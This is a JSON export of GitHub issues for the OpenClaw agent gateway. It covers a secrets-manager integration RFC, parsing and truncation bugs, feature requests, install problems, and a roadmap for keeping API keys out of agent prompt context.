          "body": "## RFC: Pluggable Secrets Manager Integration — Working Prototype\n\nWe built a working prototype for this. Sharing the design for feedback before opening a PR.\n\n**Branch:** [`feature/secrets-manager-integration`](https://github.com/akoscz/openclaw/tree/feature/secrets-manager-integration)\n**Implementation:** [`src/config/secrets/`](https://github.com/akoscz/openclaw/tree/feature/secrets-manager-integration/src/config/secrets)\n\n### Problem\n\nSecrets in `openclaw.json` are plaintext. The existing `${ENV_VAR}` substitution helps, but doesn't cover secret managers, keychains, or cloud-native credential stores.\n\n### Solution: `$secret{NAME}` syntax + pluggable providers\n\n```json5\n{\n  \"secrets\": {\n    \"provider\": \"gcp\",\n    \"gcp\": { \"project\": \"my-project-id\" }\n  },\n  \"channels\": {\n    \"slack\": {\n      \"botToken\": \"$secret{openclaw-slack-bot-token}\",\n      \"appToken\": \"$secret{openclaw-slack-app-token}\"\n    }\n  }\n}\n```\n\n### Provider Interface\n\nMinimal and extensible:\n\n```typescript\ninterface SecretsProvider {\n  name: string;\n  resolve(secretName: string): Promise<string>;\n  resolveAll?(secretNames: string[]): Promise<Map<string, string>>;\n  dispose?(): Promise<void>;\n}\n```\n\n### Providers\n\n| Provider | Status | Package/Tool |\n|----------|--------|-------------|\n| GCP Secret Manager | ✅ Implemented | `@google-cloud/secret-manager` |\n| Environment variables | ✅ Implemented | (built-in) |\n| AWS Secrets Manager | 📋 Stub | `@aws-sdk/client-secrets-manager` |\n| macOS Keychain / OS Keyring | 📋 Stub | `keytar` |\n| 1Password | 📋 Stub | 1Password CLI / Connect API |\n| Doppler | 📋 Stub | Doppler CLI / REST API |\n| Bitwarden | 📋 Stub | Bitwarden Secrets Manager SDK |\n| HashiCorp Vault | 📋 Stub | Vault HTTP API |\n\nStub providers are wired into the factory with clear \"not yet implemented\" errors and contribution pointers. We don't currently have access to these services, so no implementation is provided.\n\n### Design Decisions\n\n1. **`$secret{NAME}` syntax** — visually distinct from `${ENV_VAR}`, no parser ambiguity. Escaping via `$$secret{...}` mirrors the existing `$${...}` pattern.\n2. **Pipeline integration** — resolves after `resolveConfigEnvVars()` in `io.ts`, so you can use `${GCP_PROJECT}` inside `secrets.gcp.project`. The `secrets` block itself is excluded from resolution (no circular deps).\n3. **Sync safety** — the sync `loadConfig()` path detects unresolved `$secret{...}` refs and throws a clear error, since secret resolution requires async.\n4. **GCP provider** — uses dynamic import (optional dep), ADC for auth, in-memory caching.\n\n### What's Included\n\n- `src/config/secrets/` — provider interface, resolution logic, 8 providers (2 implemented + 6 stubs)\n- Updated `io.ts` with async resolution step + sync safety check\n- Zod schema validation for the `secrets` config block\n- 29 tests covering resolution, escaping, circular dep protection, batch paths, edge cases\n\n### Backwards Compatible\n\nNo `secrets` block = zero behavior change. Fully additive.\n\nBuilt with AI assistance (Claude). All tests passing. Happy to open a PR if the design direction looks good.\n\nRelates to: #2065, #5760, #4727"
        },
        {
          "id": 3865652958,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10033#issuecomment-3865652958",
          "createdAt": "2026-02-07T22:27:19Z",
          "updatedAt": "2026-02-07T22:35:47Z",
          "author": "akoscz",
          "body": "## Update: Cross-platform Keyring provider + more provider stubs\n\nQuick follow-up — we've expanded the prototype significantly:\n\n### New: Cross-platform Keyring provider (fully implemented)\n\nThird working provider alongside GCP and env. Uses platform-native CLIs — zero npm dependencies.\n\n**macOS** — uses the `security` CLI with a dedicated OpenClaw keychain:\n- Dedicated keychain file (`~/Library/Keychains/openclaw.keychain-db`) — doesn't pollute login keychain\n- Auto-unlock with configurable password, locks on `dispose()`\n- Tested on macOS Sequoia 15.7.3\n\n**Linux** — uses `secret-tool` (libsecret / D-Bus Secret Service API):\n- Works with GNOME Keyring, KDE Wallet, and any Secret Service provider\n- Distro-specific install instructions in error messages (Arch, Ubuntu, Fedora)\n- Tested on CachyOS (Arch-based) with libsecret 0.21.7\n\nBoth platforms get clear error messages with setup instructions. Windows shows a \"not supported\" error with contributor guidance.\n\n```json5\n{\n  \"secrets\": {\n    \"provider\": \"keyring\"\n    // Optional: \"keyring\": { \"keychainPath\": \"...\", \"account\": \"openclaw\" }\n  },\n  \"channels\": {\n    \"slack\": { \"botToken\": \"$secret{slack-bot-token}\" }\n  }\n}\n```\n\nSetup (one-time):\n```bash\n# macOS\nsecurity create-keychain -p '' ~/Library/Keychains/openclaw.keychain-db\nsecurity add-generic-password -a openclaw -s slack-bot-token -w \"xoxb-...\" ~/Library/Keychains/openclaw.keychain-db\n\n# Linux\necho -n \"xoxb-...\" | secret-tool store --label=\"openclaw: slack-bot-token\" service openclaw key slack-bot-token\n```\n\n### Additional provider stubs\n\nAdded stubs for all providers mentioned in the original issue, bringing the total to 8:\n\n| Provider | Status |\n|----------|--------|\n| GCP Secret Manager | ✅ Implemented |\n| Environment variables | ✅ Implemented |\n| macOS Keychain | ✅ Implemented |\n| Linux Keyring (libsecret) | ✅ Implemented |\n| AWS Secrets Manager | 📋 Stub |\n| 1Password | 📋 Stub |\n| Doppler | 📋 Stub |\n| Bitwarden | 📋 Stub |\n| HashiCorp Vault | 📋 Stub |\n\nEach stub is wired into the provider factory with config options and clear \"not yet implemented\" errors pointing to the source file for contributors. We don't currently have access to these services, so no implementation is provided — but the interface is ready.\n\n**Updated branch:** [`feature/secrets-manager-integration`](https://github.com/akoscz/openclaw/tree/feature/secrets-manager-integration) (6 commits, ~1200 lines, 29 tests passing)"
        },
        {
          "id": 3865829631,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10033#issuecomment-3865829631",
          "createdAt": "2026-02-08T00:30:41Z",
          "updatedAt": "2026-02-08T00:30:41Z",
          "author": "akoscz",
          "body": "PR opened: #11539\n\nImplements the `$secret{NAME}` approach discussed above with env, GCP Secret Manager, and OS keyring (macOS + Linux) providers. Full details and design rationale in the PR description."
        },
        {
          "id": 3882272885,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10033#issuecomment-3882272885",
          "createdAt": "2026-02-11T05:37:59Z",
          "updatedAt": "2026-02-11T05:37:59Z",
          "author": "nishantkabra77",
          "body": "+1 — Running OpenClaw on a home Mac mini. FileVault is on and file permissions are tight, but having all API keys (Anthropic, Slack bot tokens, Telegram bot token, etc.) in plaintext in openclaw.json and .env files is a real concern. The macOS Keychain provider in PR #11539 is exactly what's needed. Would love to see this ship soon."
        }
      ]
    },
    {
      "number": 13899,
      "title": "[Bug]:",
      "body": "",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13899",
      "createdAt": "2026-02-11T05:33:17Z",
      "updatedAt": "2026-02-11T05:36:53Z",
      "author": "dsengyoung",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13171,
      "title": "web_search with Grok provider returns \"No response\" — output_text field missing from xAI Responses API",
      "body": "## Description\n\nThe `web_search` tool configured with the `grok` provider always returns `\"No response\"` with empty citations, even though the underlying xAI Responses API call succeeds.\n\n## Root Cause\n\nIn `runGrokSearch()`, the response is extracted as:\n\n```js\ncontent: data.output_text ?? \"No response\",\ncitations: data.citations ?? [],\n```\n\nBut the xAI Responses API does **not** return a top-level `output_text` or `citations` field. The actual text is at `output[0].content[0].text` and annotations are at `output[0].content[0].annotations`.\n\n## Environment\n\n- **OpenClaw version:** 2026.2.9\n- **Node:** v25.6.0\n- **OS:** macOS Darwin 25.2.0 (arm64)\n\n## Config\n\n```json\n{\n  \"tools\": {\n    \"web\": {\n      \"search\": {\n        \"enabled\": true,\n        \"provider\": \"grok\",\n        \"grok\": {\n          \"apiKey\": \"xai-...\"\n        }\n      }\n    }\n  }\n}\n```\n\n## Request (what OpenClaw sends)\n\n```bash\ncurl -s https://api.x.ai/v1/responses \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $XAI_API_KEY\" \\\n  -d '{\n    \"model\": \"grok-4-1-fast\",\n    \"input\": [{\"role\": \"user\", \"content\": \"What is the capital of France?\"}],\n    \"tools\": [{\"type\": \"web_search\"}]\n  }'\n```\n\n## Actual API Response\n\n```json\n{\n   \"created_at\": 1770701396,\n   \"completed_at\": 1770701396,\n   \"id\": \"d6e867e8-0acf-d9f4-6bdd-227453fdb719\",\n   \"max_output_tokens\": null,\n   \"model\": \"grok-4-1-fast-reasoning\",\n   \"object\": \"response\",\n   \"output\": [\n     {\n       \"content\": [\n         {\n           \"type\": \"output_text\",\n           \"text\": \"Paris is the capital of France. It's the largest city in the\n country and has been the political, cultural, and economic center since the 10th\n century.\",\n           \"logprobs\": [],\n           \"annotations\": []\n         }\n       ],\n       \"id\": \"msg_d6e867e8-0acf-d9f4-6bdd-227453fdb719\",\n       \"role\": \"assistant\",\n       \"type\": \"message\",\n       \"status\": \"completed\"\n     }\n   ],\n   \"parallel_tool_calls\": true,\n   \"previous_response_id\": null,\n   \"reasoning\": {\n     \"effort\": null,\n     \"summary\": null\n   },\n   \"temperature\": 0.7,\n   \"text\": {\n     \"format\": {\n       \"type\": \"text\"\n     }\n   },\n   \"tool_choice\": \"auto\",\n   \"tools\": [\n     {\n       \"type\": \"web_search\",\n       \"search_context_size\": \"medium\"\n     }\n   ],\n   \"top_p\": 0.95,\n   \"usage\": {\n     \"input_tokens\": 1069,\n     \"input_tokens_details\": {\n       \"cached_tokens\": 1057\n     },\n     \"output_tokens\": 103,\n     \"output_tokens_details\": {\n       \"reasoning_tokens\": 69\n     },\n     \"total_tokens\": 1172,\n     \"num_sources_used\": 0,\n     \"num_server_side_tools_used\": 0,\n     \"cost_in_usd_ticks\": 1067500\n   },\n   \"user\": null,\n   \"incomplete_details\": null,\n   \"status\": \"completed\",\n   \"store\": true,\n   \"metadata\": {},\n   \"background\": false,\n   \"service_tier\": \"default\",\n   \"truncation\": \"disabled\",\n   \"top_logprobs\": 0,\n   \"presence_penalty\": 0.0,\n   \"frequency_penalty\": 0.0,\n   \"prompt_cache_key\": null,\n   \"max_tool_calls\": null,\n   \"safety_identifier\": null,\n   \"error\": null,\n   \"instructions\": null\n }\n\n```\n\n## What OpenClaw returns to the agent\n\n```json\n{\n  \"provider\": \"grok\",\n  \"model\": \"grok-4-1-fast\",\n  \"content\": \"No response\",\n  \"citations\": []\n}\n```\n\n## Suggested Fix\n\n```js\n// Before (broken):\ncontent: data.output_text ?? \"No response\",\ncitations: data.citations ?? [],\n\n// After:\nconst msg = data.output?.find(o => o.type === \"message\");\nconst textBlock = msg?.content?.find(c => c.type === \"output_text\");\ncontent: textBlock?.text ?? \"No response\",\ncitations: textBlock?.annotations ?? [],\n```\n",
      "state": "closed",
      "comments": 6,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13171",
      "createdAt": "2026-02-10T05:33:26Z",
      "updatedAt": "2026-02-11T05:33:53Z",
      "author": "a-anand-91119",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3875840894,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13171#issuecomment-3875840894",
          "createdAt": "2026-02-10T07:29:28Z",
          "updatedAt": "2026-02-10T07:29:28Z",
          "author": "Neerajkomatishetti",
          "body": "I think this is fixed in PR- fix(tools): correct Grok response parsing for xAI Responses API #13049 and PR is merged \n"
        },
        {
          "id": 3875973075,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13171#issuecomment-3875973075",
          "createdAt": "2026-02-10T07:56:11Z",
          "updatedAt": "2026-02-10T07:56:11Z",
          "author": "a-anand-91119",
          "body": "@Neerajkomatishetti @thewilloftheshadow \n\n Opened a fix for this in #13263.                                                                                                                                                                                                                                                                                                                                                                                               \n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             \n  The PR rewrites the parser to handle the actual response format, removes the unnecessary `inlineCitations` config (annotations are returned by default per [xAI docs](https://docs.x.ai/developers/tools/citations#enabling-inline-citations)), and adds fixture-driven tests using real API response payloads.                                                                                                                \n                                      "
        },
        {
          "id": 3877246801,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13171#issuecomment-3877246801",
          "createdAt": "2026-02-10T12:17:43Z",
          "updatedAt": "2026-02-10T12:17:43Z",
          "author": "a-anand-91119",
          "body": "Resolved in https://github.com/openclaw/openclaw/pull/13370, which supersedes #13263.\n\n**What changed:**\n\n- Rewrote `runGrokSearch` to parse the xAI Responses API output format correctly — filters for `type: \"message\"` + `status: \"completed\"`, extracts text parts and citation annotations from `message.content[]`\n- Keeps citation URLs raw (no `wrapWebContent`) for downstream tool chaining\n- Removed the dead `inlineCitations` config field (annotations are returned by default in the Responses API)\n- Default model updated to `grok-4-1-fast-reasoning`\n\nThe PR also adds Tavily as a new `web_search` provider and refactors `runWebSearch` into a clean provider dispatch pattern."
        },
        {
          "id": 3881505734,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13171#issuecomment-3881505734",
          "createdAt": "2026-02-11T00:39:18Z",
          "updatedAt": "2026-02-11T00:39:18Z",
          "author": "Takhoffman",
          "body": "Thanks for the report.\n\nThis looks like the same underlying Grok `web_search` parsing issue as #13439 (xAI `/v1/responses` returns content and citations nested under `output[].content[]`, and the top-level `output_text` is null). The canonical tracking issue is #13439.\n\nClosing as a duplicate of #13439. If you are seeing behavior that differs from #13439, please add details there (a redacted sample response payload and your `tools.web.search` config help a lot)."
        },
        {
          "id": 3882147344,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13171#issuecomment-3882147344",
          "createdAt": "2026-02-11T05:02:44Z",
          "updatedAt": "2026-02-11T05:02:44Z",
          "author": "a-anand-91119",
          "body": "@Takhoffman There are still some gaps in the grok parser. The current logic always looks at `output[0]`. But that isn't always the case. \nSee an actual response from grok here: https://github.com/a-anand-91119/openclaw/blob/8a2c7754d0672015d2b20c38da7aed9a76ae295f/src/agents/tools/__fixtures__/grok/open-claw-search.json\n\noutputs can have multiple where the first one doenst' necessarily have to be the response. it can be the web search call data.\n\nI have created a PR which fixes \n- The include attribute bug\n- extract output from the proper output object\n- handles the citations properly, \n- adding support for Tivaly search\n-  some code refactoring of the web search tool \n\nPR here: https://github.com/openclaw/openclaw/pull/13370\n\nNote: I'm planning on updating the cli to make all these providers configurable, and thewilloftheshadow suggested to add that in the same PR iteself. I'm looking at it along with some migrations as well. I can push it to the same pr or as a different pr. ( but might take some more time)\n"
        },
        {
          "id": 3882263298,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13171#issuecomment-3882263298",
          "createdAt": "2026-02-11T05:33:53Z",
          "updatedAt": "2026-02-11T05:33:53Z",
          "author": "a-anand-91119",
          "body": "@Takhoffman Just committed the change for commands during onboarding and migration to standardize brave api key in config as well.\n\n"
        }
      ]
    },
    {
      "number": 13896,
      "title": "tool_use_id orphan after limitHistoryTurns truncation causes HTTP 400",
      "body": "## Bug\n\n`limitHistoryTurns()` can orphan `tool_result` blocks, causing an HTTP 400 from the Anthropic API:\n\n```\nHTTP 400 invalid_request_error:\nmessages.14.content.1: unexpected tool_use_id found in tool_result blocks:\ntoolu_01JRe7vPiWiFCUPwUaYWKyaF. Each tool_result block must have a\ncorresponding tool_use block in the previous message.\n```\n\n## Root cause\n\nIn `src/agents/pi-embedded-runner/`, the message preparation pipeline runs `sanitizeSessionHistory()` (which calls `repairToolUseResultPairing()`) **before** `limitHistoryTurns()`. When `limitHistoryTurns()` then slices the history by user-turn count, it can remove an assistant message containing a `tool_use` block while keeping the corresponding `tool_result` in a later user message — re-introducing orphaned tool results after the repair already ran.\n\nThis affects two code paths:\n\n1. **Compaction flow** (`compactEmbeddedPiSessionDirect`):\n   ```ts\n   const prior = await sanitizeSessionHistory({ ... });\n   const limited = limitHistoryTurns(...);  // can re-orphan tool_results\n   session.agent.replaceMessages(limited);\n   ```\n\n2. **Main reply flow** (reply handler):\n   ```ts\n   const prior = await sanitizeSessionHistory({ ... });\n   const limited = limitHistoryTurns(...);  // same issue\n   activeSession.agent.replaceMessages(limited);\n   ```\n\n## Suggested fix\n\nRe-run `sanitizeToolUseResultPairing()` after `limitHistoryTurns()`:\n\n```ts\nconst truncated = limitHistoryTurns(...);\nconst limited = transcriptPolicy.repairToolUseResultPairing\n  ? sanitizeToolUseResultPairing(truncated)\n  : truncated;\n```\n\nThis ensures any orphans introduced by truncation are dropped or paired with synthetic `tool_use` blocks before the messages reach the API.\n\n## Repro conditions\n\n- Long-running DM session with tool use\n- `dmHistoryLimit` or default history limit configured\n- Conversation grows long enough for `limitHistoryTurns()` to truncate\n- Truncation boundary falls between a `tool_use` assistant message and its `tool_result`\n\n## Environment\n\n- openclaw 2026.2.2-3\n- Model: claude-opus-4-6 via Anthropic Messages API\n- Compaction mode: safeguard",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13896",
      "createdAt": "2026-02-11T05:26:37Z",
      "updatedAt": "2026-02-11T05:26:37Z",
      "author": "henryashcroft-cpu",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 9884,
      "title": "Feature: Per-agent default accountId for outbound messages",
      "body": "# Feature Request: Per-Agent Default `accountId` for Outbound Messages\n\n## Problem\n\nWhen an agent has its own Discord account (via `channels.discord.accounts.<accountId>`), the binding correctly routes **inbound** messages to that agent. However, **outbound** messages sent via the `message` tool default to the `default` account unless the agent explicitly passes `accountId` every time.\n\nThis means:\n- Agent receives message as \"agent-bot\" ✓\n- Agent replies, message appears as \"default-bot\" ✗\n\n## Current Workaround\n\nAdd explicit instructions to every agent's HEARTBEAT.md or TOOLS.md:\n\n```markdown\n## Communication\n\nWhen sending messages, always use your own Discord account:\n```\nmessage action=send accountId=agent-bot target=channel:... message=\"...\"\n```\n\nDo NOT use the default account — that's the main bot, not you.\n```\n\nThis is:\n- Tedious (every agent needs manual instruction)\n- Error-prone (agents forget, especially after context compaction)\n- Inconsistent (inbound routing is automatic, outbound isn't)\n\n## Proposed Solution\n\nAdd an optional `defaultAccountId` field at the agent level:\n\n```json5\n{\n  agents: {\n    list: [\n      {\n        id: \"agent-a\",\n        name: \"Agent A\",\n        workspace: \"...\",\n        defaultAccountId: {\n          discord: \"agent-a-bot\"\n        }\n        // or simpler: defaultAccountId: \"agent-a-bot\" if channel-agnostic\n      }\n    ]\n  }\n}\n```\n\nWhen an agent uses the `message` tool without specifying `accountId`, it should use its configured default instead of falling back to the channel's `default` account.\n\n## Alternative Approaches\n\n1. **Infer from binding** — If an agent has a binding with `accountId: \"agent-bot\"`, automatically use that for outbound on the same channel. Could be surprising if multiple bindings exist.\n\n2. **Identity block** — Extend `agents.list[].identity` to include `accountId`:\n   ```json5\n   identity: {\n     name: \"Agent A\",\n     accountId: { discord: \"agent-a-bot\" }\n   }\n   ```\n\n3. **Symmetric bindings** — Make bindings apply to both inbound and outbound routing.\n\n## Affected Agents\n\nAny multi-agent setup where agents have dedicated Discord bots (or WhatsApp accounts, etc.) but share the same Gateway.\n\n## Environment\n\n- OpenClaw version: 2026.1.29\n- Channel: Discord (likely affects WhatsApp and others with multi-account support)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9884",
      "createdAt": "2026-02-05T20:25:49Z",
      "updatedAt": "2026-02-11T05:04:22Z",
      "author": "electronicshaman",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp",
          "discord"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882152193,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9884#issuecomment-3882152193",
          "createdAt": "2026-02-11T05:04:22Z",
          "updatedAt": "2026-02-11T05:04:22Z",
          "author": "liaosvcaf",
          "body": "**Strong +1 for this feature.**\n\nWe're running a multi-agent setup where each agent represents a completely different business context or project. Each needs its own communication identity.\n\n**Current problem:** Inbound routing works correctly (messages to project-a@domain-a.org reach Project A's agent), but outbound messages default to a shared account unless we explicitly pass `accountId` in every `message` tool call. This breaks after context compaction.\n\n**Use case:** Project A's agent handles correspondence for one initiative and should send from `contact@domain-a.org`. Project B's agent handles a completely different initiative and should send from `info@domain-b.com`. These are distinct business contexts, not just functional roles - recipients expect each project to have its own consistent sender identity.\n\nThe current workaround (adding explicit `accountId` instructions to workspace files) is fragile and inconsistent with how inbound routing already works.\n\n**Proposed solution preference:** Option 2 (identity block) seems most consistent with existing agent config structure. Having `defaultAccountId` at the agent level would make outbound routing symmetric with inbound.\n\nThis would also pair well with email channel support once available (related: #2288)."
        }
      ]
    },
    {
      "number": 13887,
      "title": "False positive billing error detection in sanitizeUserFacingText rewrites valid agent replies",
      "body": "## Bug Description\n\n`sanitizeUserFacingText()` in `pi-embedded-helpers` incorrectly rewrites **successful agent responses** as billing errors when the response text contains certain keyword combinations.\n\n## Root Cause\n\nThe function `isBillingErrorMessage()` checks:\n\n```javascript\nvalue.includes(\"billing\") && (value.includes(\"upgrade\") || value.includes(\"credits\") || value.includes(\"payment\") || value.includes(\"plan\"))\n```\n\nThis runs on the agent's **reply text** via `sanitizeUserFacingText()`, not just on error messages. When the agent discusses topics like Shopify billing settings, payment card setup, or subscription plans, the reply naturally contains these keywords and gets **entirely replaced** with:\n\n> ⚠️ API provider returned a billing error — your API key has run out of credits or has an insufficient balance. Check your provider's billing dashboard and top up or switch to a different API key.\n\n## Steps to Reproduce\n\n1. Set up OpenClaw with a Slack channel\n2. Ask the agent to help with a task involving billing/payment topics (e.g., \"set up a Shopify store and add payment details\")\n3. The agent generates a valid response containing words like \"billing\" and \"payment\" together\n4. The response is replaced with the billing error message before delivery to Slack\n5. The user sees only the billing error, not the actual response\n\n## Expected Behavior\n\n`sanitizeUserFacingText()` should only run on actual error messages (where `stopReason === \"error\"`), not on successful agent responses.\n\n## Actual Behavior\n\nThe sanitizer runs on all outbound text, causing false positives when the agent discusses billing, payment, or credit-related topics.\n\n## Workaround\n\nUsing the `message` tool to send replies directly bypasses the sanitizer and delivers the actual response text.\n\n## Environment\n\n- OpenClaw version: 2026.2.9 (latest)\n- Channel: Slack (socket mode)\n- OS: macOS (Darwin arm64)\n\n## Suggested Fix\n\nEither:\n1. Only apply `sanitizeUserFacingText()` to messages with `stopReason === \"error\"` (not successful completions)\n2. Add a confidence threshold or additional context checks to `isBillingErrorMessage()` to avoid false positives on normal conversational text\n3. Check for the presence of actual HTTP status codes or API error structures before triggering the rewrite\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13887",
      "createdAt": "2026-02-11T05:02:51Z",
      "updatedAt": "2026-02-11T05:02:51Z",
      "author": "titusmarlowe",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 11049,
      "title": "Error on install with Powershell",
      "body": "This is what shows up when it tries to download binary\n\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    node.exe : npm error code ENOENT\n    At line:1 char:1\n\n    + & \"C:\\Program Files\\nodejs/node.exe\" \"C:\\Program Files\\nodejs/node_mo ...\n    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (npm error code ENOENT:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\nI tried running PowerShell as Administrator, i tried command line, nothing works.\nI have Windows 11 Pro Insider Branch",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11049",
      "createdAt": "2026-02-07T10:02:53Z",
      "updatedAt": "2026-02-11T04:55:57Z",
      "author": "Enderman7494",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881638489,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11049#issuecomment-3881638489",
          "createdAt": "2026-02-11T01:35:12Z",
          "updatedAt": "2026-02-11T01:35:12Z",
          "author": "zhenghuanluck",
          "body": "got the same problem!"
        },
        {
          "id": 3882122313,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11049#issuecomment-3882122313",
          "createdAt": "2026-02-11T04:55:56Z",
          "updatedAt": "2026-02-11T04:55:56Z",
          "author": "lywbh",
          "body": "same problem"
        }
      ]
    },
    {
      "number": 12985,
      "title": "Telegram commands list reset/lost after upgrading to 2026.2.9",
      "body": "### Description\nAfter upgrading to OpenClaw 2026.2.9, the Telegram bot command list (accessible via `/`) is completely empty or reset. \n\n### Steps to Reproduce\n1. Upgrade OpenClaw to 2026.2.9.\n2. Restart the gateway service.\n3. Open Telegram and type `/`.\n4. The command autocomplete list is missing previously available commands (e.g., `/new`, `/model`, `/role`, etc.).\n\n### Expected Behavior\nThe command list should persist or be automatically re-populated with available commands (including core commands, skill commands, and hooks like `/new`).\n\n### Actual Behavior\nThe command list is cleared. Manually pushing commands via `setMyCommands` API is required to restore them.\n\n### Environment\n- OpenClaw Version: 2026.2.9\n- OS: Linux (Debian)\n- Channel: Telegram",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12985",
      "createdAt": "2026-02-10T01:14:40Z",
      "updatedAt": "2026-02-11T04:54:28Z",
      "author": "jhzhang09",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3874785744,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12985#issuecomment-3874785744",
          "createdAt": "2026-02-10T01:21:44Z",
          "updatedAt": "2026-02-10T01:21:44Z",
          "author": "Leonccaa",
          "body": "+1\n\nOpenClaw Version: 2026.2.9\nOS: Macos\nChannel: Telegram\n"
        },
        {
          "id": 3877023392,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12985#issuecomment-3877023392",
          "createdAt": "2026-02-10T11:27:02Z",
          "updatedAt": "2026-02-10T11:27:02Z",
          "author": "nusquama",
          "body": "similar for me"
        },
        {
          "id": 3882114776,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12985#issuecomment-3882114776",
          "createdAt": "2026-02-11T04:54:28Z",
          "updatedAt": "2026-02-11T04:54:28Z",
          "author": "XZB-1248",
          "body": "Same issue for me..."
        }
      ]
    },
    {
      "number": 11829,
      "title": "Security Roadmap: Protecting API Keys from Agent Access",
      "body": "## Summary\n\nOpenClaw currently has multiple vectors where API keys can leak to the LLM or be exposed in chat. This roadmap proposes a layered approach to comprehensively protect secrets.\n\n## The Problem\n\n1. **LLM Provider Keys** — Model catalog with resolved apiKey values is serialized into prompt context (#11202)\n2. **Agent-Accessible Keys** — Agent can read .env files and accidentally display credentials in chat (#10659)\n3. **Channel Tokens** — Telegram, Discord, and other tokens are in openclaw.json, potentially accessible\n\nThese aren't edge cases. Real users have had keys exposed in chat while debugging.\n\n## Proposed Solution: Three Layers\n\n### Layer 1: Stop models.json Leak (Quick Fix)\n\n**Problem:** `models-config.ts` writes apiKey to `models.json`, which gets serialized to prompt context.\n\n**Fix:** Strip apiKey from models.json before writing. Store auth credentials separately for authentication only.\n\n**Files:**\n- `src/agents/models-config.ts` (~line 133)\n- `src/agents/models-config.providers.ts`\n\n**Scope:** ~100 lines\n**Timeline:** Days\n**Impact:** Stops LLM provider keys from leaking\n\n---\n\n### Layer 2: Masked Secrets Architecture (#10659)\n\n**Problem:** Agents can read any file they have permission to access, including .env files with secrets.\n\n**Fix:** Implement proper secrets handling:\n\n```yaml\n# Config uses placeholder\napiKey: \"{{secret:ANTHROPIC_KEY}}\"\n\n# Agent sees placeholder, never real value\n# Runtime substitutes when making API call\n# Output is redacted if key appears accidentally\n```\n\n**Components:**\n1. Secret placeholder syntax (`{{secret:VAR}}`)\n2. Runtime substitution layer\n3. Output redaction filter\n4. Secure secrets storage\n\n**Scope:** Significant engineering\n**Timeline:** Weeks\n**Impact:** Protects ALL secrets (provider keys, channel tokens, external APIs)\n\n---\n\n### Layer 3: Fix Upstream (pi-coding-agent)\n\n**Problem:** The `@mariozechner/pi-coding-agent` package serializes model catalog (including apiKey) to prompt context.\n\n**Fix:** That package should filter secret-looking fields before prompt serialization.\n\n**Scope:** External dependency\n**Timeline:** Depends on upstream maintainer\n**Impact:** Fixes root cause for all users of that package\n\n---\n\n## Workarounds Available Today\n\nWhile waiting for platform fixes, users can protect agent-called APIs using Linux user isolation:\n\n- **Guide:** https://github.com/jmkritt/openclaw-secrets-hardening\n- **Docs PR:** #11622\n\nThis protects keys the agent calls (CRMs, external APIs) but doesn't address LLM provider keys or channel tokens.\n\n---\n\n## Proposed Prioritization\n\n1. **Immediate:** Layer 1 (quick fix, stops critical leak)\n2. **Short-term:** Layer 2 (proper architecture)\n3. **Long-term:** Layer 3 (upstream fix)\n\n---\n\n## Related Issues\n\n- #10659 — Feature request for masked secrets\n- #11202 — Model catalog apiKey leak to prompt context\n- #11622 — Docs PR for user isolation workaround\n\n---\n\n## Questions for Maintainers\n\n1. Is this roadmap aligned with how you'd approach the problem?\n2. Would Layer 1 be accepted as a PR while Layer 2 is designed?\n3. Is there existing work on secrets handling we should know about?\n\nHappy to help implement any of these layers.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11829",
      "createdAt": "2026-02-08T11:52:12Z",
      "updatedAt": "2026-02-11T04:42:15Z",
      "author": "jmkritt",
